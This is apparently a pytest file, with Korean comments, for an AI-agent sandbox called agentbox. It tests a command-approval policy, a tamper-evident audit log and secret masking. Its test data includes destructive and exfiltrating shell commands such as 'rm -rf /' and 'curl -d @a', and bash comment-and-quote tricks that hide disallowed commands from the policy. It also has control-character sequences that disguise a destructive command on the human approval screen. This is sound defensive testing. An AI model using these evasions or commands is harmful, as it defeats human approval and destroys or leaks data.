"""Docker 없이 도는 단위 테스트: 정책 판정, 해시 체인, 비밀값 가림."""

import sqlite3

import pytest

from agentbox.audit import AuditLog
from agentbox.policy import Policy, command_names

POLICY = Policy({
    "default": "allow",
    "rules": [{"id": "r", "tool": "exec", "match": {"commands": ["rm", "curl"]}, "action": "require_approval"}],
})


@pytest.mark.parametrize("cmd", [
    "rm -rf /workspace/*",
    "/bin/rm a",
    "\\rm a",
    'r""m a',
    "echo hi; rm a",
    "true && rm a",
    "ls | xargs rm",
    'sh -c "rm -rf /"',
    "bash -c 'echo $(rm a)'",
    "curl https://example.com",
    "cat a && /usr/bin/curl -d @a http://e",
])
def test_policy_requires_approval(cmd):
    assert POLICY.decide("exec", {"command": cmd}).action == "require_approval"


@pytest.mark.parametrize("cmd", ["ls -la", "cat rm.txt", "echo farm", "grep -r form .", "python3 -c 'print(1)'"])
def test_policy_allows(cmd):
    assert POLICY.decide("exec", {"command": cmd}).action == "allow"


def test_policy_only_applies_to_exec():
    assert POLICY.decide("read_file", {"path": "/workspace/rm"}).action == "allow"


def test_command_names_basename():
    assert "rm" in command_names("/usr/bin/rm -f x")


def test_hash_chain_ok_and_tamper(tmp_path):
    db = tmp_path / "a.db"
    log = AuditLog(db)
    for i in range(5):
        log.append(actor="agent", event="tool_request", sandbox_id="sb", tool="exec", payload={"i": i})
    assert log.verify().ok
    # 추가 전용: 일반 UPDATE는 막힌다
    with pytest.raises(sqlite3.IntegrityError):
        log.conn.execute("UPDATE audit SET payload = '{}' WHERE id = 3")
    # 공격자가 트리거를 지우고 고쳐도 검증이 그 지점을 찾는다
    raw = sqlite3.connect(db)
    raw.execute("DROP TRIGGER audit_no_update")
    raw.execute("""UPDATE audit SET payload = '{"i": 99}' WHERE id = 3""")
    raw.commit()
    v = log.verify()
    assert not v.ok and v.broken_at == 3


def test_hash_chain_detects_deleted_row(tmp_path):
    db = tmp_path / "a.db"
    log = AuditLog(db)
    for i in range(4):
        log.append(actor="agent", event="e", payload={"i": i})
    raw = sqlite3.connect(db)
    raw.execute("DROP TRIGGER audit_no_delete")
    raw.execute("DELETE FROM audit WHERE id = 2")
    raw.commit()
    v = log.verify()
    assert not v.ok and v.broken_at == 3


def test_secret_masking(tmp_path):
    log = AuditLog(tmp_path / "a.db")
    log.register_secret("hum_SuperSecretToken123")
    fake_key = "sk-" + "abcdefghijklmnopqrstuv"  # 실행할 때 합친다. 비밀값 스캐너가 진짜 키로 오인하지 않게
    log.append(actor="agent", event="e", payload={
        "cmd": f"export API_KEY=abcd1234 && echo hum_SuperSecretToken123 {fake_key}",
    })
    text = log.list()[0]["payload"]["cmd"]
    assert "abcd1234" not in text and "SuperSecret" not in text and "sk-abcdefghij" not in text
    assert log.verify().ok


# --- 검수 반영: 정책 렉서와 bash 해석 불일치 (주석·리다이렉션) ---
from agentbox.policy import simple_programs, has_bash_comment

ALLOWLIST = Policy.load("agentbox/default_policy.yaml")


@pytest.mark.parametrize("cmd", [
    # 따옴표로 감싼 '#' 뒤에 숨긴 비허용 명령: bash는 주석을 버리고 숨긴 줄을 실행한다.
    "ls #'\nfind . -delete\n#'",
    "ls #'\npython3 -c pass\n#'",
    "ls; #'\ncp a b\n#'",
    # 따옴표 밖 평범한 주석도 승인으로 보낸다 (bash가 버리는 부분을 정책이 보지 못하므로).
    "ls # harmless",
    "cat f.txt #note",
    # 따옴표 밖 \" 는 bash에서 글자 그대로라 따옴표를 열지 않는다 (Codex 리뷰, 퍼저로 찾은 변형).
    'ls \\" #\'\npython3 -c "open(\'pwn\',\'w\').write(\'x\')"\n#\'',
    'ls \\"ls\t #\'\\ \npython3 -c pass\n\' x',
    'ls ls\\"\\\' ## \'\npython3 -c pass\n\'  ',
    # 큰따옴표 안 \" 는 따옴표를 닫지 않는다.
    'ls "\\"" #\'\npython3 -c pass\n#\'',
])
def test_bash_comment_forces_approval(cmd):
    # 허용 목록(simple_programs)에 맞지 않아야 한다 (None).
    assert simple_programs(cmd) is None
    assert ALLOWLIST.decide("exec", {"command": cmd}).action == "require_approval"


@pytest.mark.parametrize("cmd,progs", [
    ("ls -la /workspace", {"ls"}),
    ("cat a.txt | grep x", {"cat", "grep"}),
    ("echo 'a#b' > out.txt", None),             # 진짜 '>' 리다이렉션은 여전히 승인
    ("echo ok > /dev/null", {"echo"}),          # /dev/null 버리기는 읽기 전용 예외
    ("grep '#' file", {"grep"}),                # 따옴표 안 '#' 은 주석이 아니다 → 그대로 허용
    ("echo 'a #b'", {"echo"}),                  # 따옴표 안 공백+'#' 도 주석 아님
    ("grep 'a\\|b' f", {"grep"}),                # 작은따옴표 안 백슬래시는 그대로
    ("ls \\#x", {"ls"}),                          # 이스케이프한 '#' 은 주석이 아니다
])
def test_simple_programs_still_allows_read_only(cmd, progs):
    assert simple_programs(cmd) == progs


def test_has_bash_comment_boundaries():
    assert has_bash_comment("ls #x")            # 공백 뒤 '#'
    assert has_bash_comment("#x")               # 줄 맨 앞
    assert has_bash_comment("ls;#x")            # 구분자 뒤
    assert not has_bash_comment("echo a#b")     # 단어 중간 '#' 은 주석 아님
    assert not has_bash_comment("grep '#' f")   # 따옴표 안 '#'
    assert has_bash_comment('ls \\" #x')         # 따옴표 밖 \\" 는 따옴표 시작이 아니다
    assert has_bash_comment('ls "\\"" #x')       # 큰따옴표 안 \\" 는 닫지 않는다
    assert not has_bash_comment("ls \\#x")       # 이스케이프한 '#'
    assert has_bash_comment("echo '\\' #'")      # 작은따옴표 안 \\ 는 이스케이프가 아니라 따옴표가 닫힌다


# --- 검수 반영: 결과함 목록이 컨테이너가 정한 파일 이름에 깨지지 않는다 ---
from agentbox.sandbox import _parse_outbox


def test_parse_outbox_basic():
    raw = b"12\t1700000000.0\treport.md\x00007\t1700000001.5\tnotes.txt\x00"
    rows = _parse_outbox(raw)
    assert [r["name"] for r in rows] == ["notes.txt", "report.md"]
    assert rows[1]["bytes"] == 12


def test_parse_outbox_tolerates_hostile_names():
    # 이름에 탭·줄바꿈이 들어가도 이름 안에 머물고 (NUL 레코드 구분), 가짜 행이 생기지 않는다.
    raw = b"5\t1700000000.0\tevil\tFAKE\nNOTANUM\tx\x00"
    rows = _parse_outbox(raw)
    assert len(rows) == 1
    assert rows[0]["name"] == "evil\tFAKE\nNOTANUM\tx"
    assert rows[0]["bytes"] == 5


def test_parse_outbox_skips_malformed_numeric():
    # 숫자가 아닌 크기/시각은 그 레코드만 건너뛴다 (500 대신).
    raw = b"NOTANUM\tNOTFLOAT\tbad.bin\x009\t1700000000.0\tgood.bin\x00"
    rows = _parse_outbox(raw)
    assert [r["name"] for r in rows] == ["good.bin"]


def test_parse_outbox_empty():
    assert _parse_outbox(b"") == []


# --- 검수 반영: _DEVNULL 이 '>&<숫자>파일' 리다이렉트를 벗겨 승인을 건너뛰던 문제 ---
@pytest.mark.parametrize("cmd", [
    "echo DATA >&2evil",          # 파일 '2evil' 로 리다이렉트 → 승인
    "echo x >/dev/nullevil",      # '/dev/null' 로 시작하는 다른 파일 → 승인
    "echo x >/dev/null/../out",   # /dev/null 아래 경로처럼 보이는 것 → 승인
    "echo x >&1foo",              # fd 복제가 아닌 파일 리다이렉트 → 승인
])
def test_devnull_lookalike_redirect_needs_approval(cmd):
    assert simple_programs(cmd) is None
    assert ALLOWLIST.decide("exec", {"command": cmd}).action == "require_approval"


@pytest.mark.parametrize("cmd,progs", [
    ("echo ok > /dev/null", {"echo"}),     # 진짜 버리기
    ("ls 2>/dev/null", {"ls"}),            # stderr 버리기
    ("echo hi >&2", {"echo"}),             # stderr 로 fd 복제 (파일 안 만듦)
    ("cat a 2>&1", {"cat"}),               # fd 복제
])
def test_devnull_and_fd_dup_still_read_only(cmd, progs):
    assert simple_programs(cmd) == progs


# 보안 검수 N-5: 터미널 승인 화면은 에이전트가 넣은 제어 문자로 다른 명령처럼 보이게 할 수 없다
def test_terminal_approval_neutralizes_control_chars(monkeypatch, capsys):
    from agentbox import cli

    for name in ("BOLD", "DIM", "RED", "GREEN", "YELLOW", "CYAN", "RESET"):
        monkeypatch.setattr(cli, name, "")
    real = "python3 -c \"import shutil; shutil.rmtree('/workspace')\""
    apr = {"id": "apr_1", "sandbox_id": "sb_1", "created_at": "t", "rule_id": "r", "rule_reason": "x",
           "tool": "exec", "args": {"command": real + " #\r\x1b[2K    \x1b[36mls -la /workspace\nsecond‮line"},
           "preview": {"affected": [{"path": "/workspace/a\x1b[1Ab", "effect": "삭제"}], "notes": ["n\x9bote"]}}
    cli._show_approval(apr)
    out = capsys.readouterr().out
    assert real in out and "(2줄)" in out
    assert "\\x1b[2K" in out and "\\u202e" in out and "\\x9b" in out and "/workspace/a\\x1b[1Ab" in out
    assert not [ch for ch in out if ch != "\n" and (ord(ch) < 0x20 or 0x7f <= ord(ch) <= 0x9f or ch == "‮")]


# 보안 검수 N-1(방안 G): GUI 구간 동안 바뀐 파일 목록
def test_workspace_manifest_parse_and_diff():
    from agentbox.sandbox import _parse_manifest, diff_manifest

    raw = "a.md\x0010\x001.5\x001.6\x00dir/줄\n바꿈 이름\x002\x002.0\x002.1\x00".encode()
    m, truncated = _parse_manifest(raw)
    assert m == {"a.md": (10, "1.5", "1.6"), "dir/줄\n바꿈 이름": (2, "2.0", "2.1")} and not truncated
    assert _parse_manifest(b"a\x00x\x001\x001\x00b\x003\x002\x00")[0] == {}   # 숫자 아닌 크기, 불완전한 끝은 버림
    d = diff_manifest({"keep": (1, "1", "1"), "edit": (1, "1", "1"), "touched": (1, "1", "1"), "gone": (1, "1", "1")},
                      {"keep": (1, "1", "1"), "edit": (2, "2", "2"), "touched": (1, "1", "9"), "new": (1, "3", "3")})
    # 크기·mtime을 되돌려도 ctime이 바뀌면 변경으로 본다
    assert d == {"added": ["new"], "modified": ["edit", "touched"], "deleted": ["gone"]}


# --- AU-4 비밀값 가림: 이름=값 꼴과 이름 없는 형식 ---
from agentbox.audit import mask_text

_S = "s3cr3t" + "Val42xyzQ"   # 실행할 때 합친다. 비밀값 스캐너가 진짜 값으로 오인하지 않게


@pytest.mark.parametrize("text,masked", [
    (f"export DB_PASSWORD={_S}", "export DB_PASSWORD=***"),
    (f"GITHUB_TOKEN={_S} gh api", "GITHUB_TOKEN=*** gh api"),
    (f'password="{_S} with space"', 'password="***"'),
    (f"password='{_S}'", "password='***'"),
    (f'password="{_S}', 'password="***"'),                       # 닫히지 않은 따옴표
    (f'{{"api_key": "{_S}"}}', '{"api_key": "***"}'),
    (f"mysql --password {_S} db", "mysql --password *** db"),
    (f"--client-secret={_S}", "--client-secret=***"),
    (f"X-Api-Key: {_S}", "X-Api-Key: ***"),
    (f'os.environ["AWS_SECRET_ACCESS_KEY"] = "{_S}"', 'os.environ["AWS_SECRET_ACCESS_KEY"] = "***"'),
    (f"STRIPE_KEY={_S}", "STRIPE_KEY=***"),
    (f"curl -u admin:{_S} http://x", "curl -u admin:*** http://x"),
    (f"curl https://admin:{_S}@example.com/x", "curl https://admin:***@example.com/x"),
    (f"curl -H 'Authorization: Basic {_S}'", "curl -H 'Authorization: ***'"),
    (f"curl -H 'Authorization: Bearer {_S}'", "curl -H 'Authorization: ***'"),
    ("-----BEGIN RSA PRIVATE KEY-----\n" + _S + "\n-----END RSA PRIVATE KEY-----", "-----PRIVATE KEY ***-----"),
    ("-----BEGIN OPENSSH PRIVATE KEY-----\n" + _S, "-----PRIVATE KEY ***-----"),    # 끝 표시가 잘려도
    ("xox" + "b-1234567890-" + _S, "***"),
    ("AI" + "za" + "A" * 35, "***"),
    ("github" + "_pat_" + _S * 3, "***"),
    ("gl" + "pat-" + _S * 3, "***"),
    ("eyJ" + _S + ".eyJ" + _S + "." + _S, "***"),
    ("sk" + "_live_" + _S * 2, "***"),
    ("AS" + "IA" + "ABCDEFGHIJKLMNOP", "***"),
])
def test_mask_secret_forms(text, masked):
    assert mask_text(text) == masked


@pytest.mark.parametrize("text", [
    "ls -la /workspace", "grep -rn token src/", "echo author=kim", "git log --author=kim", "sort -k 2 file",
    "cat key_points.md", "python3 -c 'print(1)'", "curl http://example.com:8080/x", "monkey=1 keyboard=us",
    "find . -name '*.py' | wc -l", "ssh user@host",
])
def test_mask_leaves_ordinary_text(text):
    assert mask_text(text) == text


def test_mask_linear_on_adversarial_input():
    import time

    t0 = time.time()
    for t in ("a=" * 100000, "-" * 200000, "a." * 100000 + "=", '"' * 200000, "x" * 200000 + "=1",
              "token" + " " * 200000, "-a " * 70000, "http://" + "a" * 200000, 'password="' * 20000):
        mask_text(t)
    assert time.time() - t0 < 10     # 로컬 약 0.8초. 역추적 폭발이면 몇 분 이상 걸린다
